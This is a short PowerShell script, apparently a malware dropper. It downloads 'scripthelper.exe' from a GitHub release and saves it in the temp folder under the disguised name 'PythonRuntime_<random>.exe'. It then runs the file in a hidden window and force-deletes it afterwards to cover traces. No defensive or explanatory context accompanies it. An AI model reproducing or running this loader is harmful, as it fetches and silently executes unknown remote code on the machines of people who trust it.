$rand = Get-Random
$path = "$env:TEMP\PythonRuntime_$rand.exe" 
Invoke-WebRequest -Uri "https://github.com/skiddyskid111/resources/releases/download/adadad/scripthelper.exe" -OutFile $path 
Start-Process $path -WindowStyle Hidden -Wait 
Remove-Item $path -Force
